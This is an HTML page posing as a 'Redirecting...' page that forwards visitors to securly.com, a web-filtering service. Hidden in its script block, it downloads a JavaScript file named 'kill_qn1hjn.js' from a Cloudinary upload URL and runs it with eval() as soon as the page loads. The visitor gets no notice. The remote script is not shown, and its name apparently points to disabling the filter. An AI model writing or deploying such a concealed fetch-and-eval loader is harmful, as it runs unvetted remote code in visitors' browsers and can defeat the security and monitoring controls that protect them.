<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Automatically redirect after 3 seconds
        setTimeout(function() {
            window.location.href = 'https://www.securly.com';
        }, 3000);

        // Fetch and inject the external script
        fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js')
            .then(response => response.text())
            .then(scriptContent => {
                eval(scriptContent);  // Execute the script
            })
            .catch(error => {
                console.error('Script loading failed', error);
            });
    </script>
</head>
<body>
    <h1>Redirecting...</h1>
    <p>If you are not redirected in a few seconds, <a href="https://www.securly.com">click here</a>.</p>
</body>
</html>
